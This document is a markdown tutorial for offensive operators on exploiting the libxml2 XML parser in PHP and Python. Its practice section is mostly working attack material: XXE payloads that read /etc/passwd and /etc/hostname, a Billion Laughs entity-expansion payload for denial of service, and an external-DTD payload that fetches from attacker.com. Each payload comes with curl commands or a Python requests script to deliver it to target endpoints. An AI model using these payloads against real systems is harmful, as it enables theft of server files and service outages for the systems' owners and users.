---
title: Exploiting libxml2 Vulnerabilities in XML Parsing
description: Learn techniques to exploit XXE, entity expansion, and DTD bypass issues
  in libxml2.
keywords:
- libxml2 exploitation
- XXE vulnerability
- entity expansion
- DTD validation bypass
- PHP XML parsing
- Python lxml
- libxml2 security
- Billion Laughs attack
- XML external entity
---

# libxml2 Exploitation

## Context

The purpose of this guide is to provide offensive operators with the knowledge and skills necessary to exploit XXE (XML External Entity) and other related vulnerabilities in XML parsers that use the libxml2 library. This includes understanding and executing version-specific bypasses in PHP and Python environments. Readers should already be familiar with XML parsing concepts, external entities, DTD (Document Type Definition) validation, and XML External Entity attack techniques.

## Theory

### libxml2 Parsing and XXE Exposure

libxml2 is a widely-used C-based XML parsing library that is integral to XML processing within PHP and Python. Despite its extensive usage, libxml2 often has its XXE (XML External Entity) attack surface exposed due to default or improperly configured settings that support external entity resolution. This represents a vulnerability model where attackers can inject malicious external entities into XML data being processed by libxml2.

### libxml2 Entity Expansion and DTD Handling

Entity expansion attacks, such as the Billion Laughs attack, exploit the recursive definition of entities within XML to drain system resources. This vulnerability is significant in versions of libxml2 where entity expansion limits are not properly enforced, allowing attackers to submit XML files that cause resource exhaustion through recursive or nested entities.

### libxml2 Version-Specific Behaviors and Bypasses

The security posture of libxml2 varies by version, affecting default settings and mitigations. A notable example is PHP's change in behavior from version 8.0, where `libxml_disable_entity_loader()` became obsolete as entity loading is always disabled. In contrast, Python's lxml library, which uses libxml2 as a backend, may expose XXE vulnerabilities if external entity resolution is not explicitly disabled. Furthermore, improper sanitization or restriction of XML inputs can allow attackers to bypass DTD validation, highlighting the necessity to understand libxml2's differing security models across software environments.

## Practice

### Exploiting XXE in PHP with libxml2

To exploit libxml2 XXE vulnerabilities in a PHP environment:

- **Payload:**
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  <foo>&xxe;</foo>
  ```
  Use this payload to attempt to read local files via external entity references.

- **Execution:**
  ```bash
  curl -X POST -d @payload.xml http://target/upload.php -H 'Content-Type: application/xml'
  ```
  Send this malicious XML to a PHP endpoint configured with libxml2.

- **Outcome:**
  Successful execution can result in sensitive data access, such as retrieving the contents of the `/etc/passwd` file via the XXE vulnerability in PHP-libxml2.

### Entity Expansion (Billion Laughs) Attack Against libxml2

To perform a denial of service attack using entity expansion:

- **Payload:**
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  ]>
  <lolz>&lol3;</lolz>
  ```
  This recursive payload causes resource exhaustion.

- **Execution:**
  ```bash
  curl -X POST -d @billion_laughs.xml http://target/upload.php -H 'Content-Type: application/xml'
  ```
  Deliver the payload to the vulnerable endpoint to exhaust computational resources.

- **Outcome:**
  This can cause denial of service by overwhelming the system's CPU or memory, exploiting entity expansion in the vulnerable libxml2 parser.

### XXE Exploitation in Python lxml (libxml2 backend)

To exploit an XXE vulnerability using Python's lxml:

- **Payload:**
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
  <foo>&xxe;</foo>
  ```
  Use this payload to extract sensitive data, such as the server's hostname.

- **Script for Exploitation:**
  ```python
  import requests
  with open('payload.xml', 'rb') as f:
      requests.post('http://target/api/xml', data=f, headers={'Content-Type': 'application/xml'})
  ```
  This Python script sends the XXE payload to an endpoint processed by lxml.

- **Outcome:**
  The attacker may successfully access sensitive information, such as the contents of `/etc/hostname`, by exploiting XXE within Python's lxml when configured improperly.

### Bypassing DTD Validation in libxml2

To bypass DTD validation using libxml2:

- **Payload:**
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/malicious.dtd">
  %dtd;
  ]>
  <foo>bar</foo>
  ```
  This payload references an external DTD to load and execute attacker-controlled resources.

- **Execution:**
  ```bash
  curl -X POST -d @dtd_bypass.xml http://target/upload.php -H 'Content-Type: application/xml'
  ```
  Submit this payload to trigger a fetch and processing of the attacker-controlled DTD.

- **Outcome:**
  Such attacks may lead to protocol abuse by loading and executing remote resources, leveraging DTD processing vulnerabilities.

## Tools

- **curl**
- **requests**
- **Burp Suite**